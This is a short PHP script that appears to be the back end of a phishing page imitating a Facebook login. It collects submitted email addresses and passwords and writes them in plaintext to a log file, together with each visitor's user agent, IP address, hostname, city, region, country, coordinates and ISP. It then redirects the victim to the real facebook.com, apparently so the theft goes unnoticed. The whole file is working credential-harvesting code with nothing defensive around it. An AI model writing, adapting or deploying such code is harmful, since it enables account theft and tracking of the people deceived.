<?php
ob_start();
include 'func.php';
$pwd = getcwd();
$date = date('Y-m-d H:i:s');

if(isset($_POST['email']) && isset($_POST['pass'])){ 

    $head = $_SERVER['REQUEST_METHOD'] .' - '. $_SERVER['SERVER_PROTOCOL'] . ' - ' . $_SERVER['PHP_SELF'] . "\n" . $_SERVER['HTTP_USER_AGENT'] ;
    
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $data = 'username => '. $email . ' | password => ' . $pass . ' | date => ' . $date;

    $client_ip = get_client_ip();
    $ipdetail = ip_details($client_ip);
    $ipinfo = 'ip => ' . $ipdetail->ip;
    $ipinfo .= ' | hostname => ' . $ipdetail->hostname;
    $ipinfo .= ' | city => ' . $ipdetail->city;
    $ipinfo .= ' | region => ' . $ipdetail->region;
    $ipinfo .= "\ncountry => " . $ipdetail->country;
    $ipinfo .= ' | loc => ' . $ipdetail->loc;
    $ipinfo .= ' | org => ' . $ipdetail->org;

    $push = str_repeat("-", 40) . "\n" . $head ."\n". $data ."\n". $ipinfo ."\n" . str_repeat("-", 40) . "\n";
    $ret = file_put_contents('data/auth.log', $push, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
    	$url = 'http://facebook.com'; //define your location you want to redirect
    	header('Location: ' . $url); exit();
        echo 'hello';
    }


}
else {
   die('no post data to process');
}


?>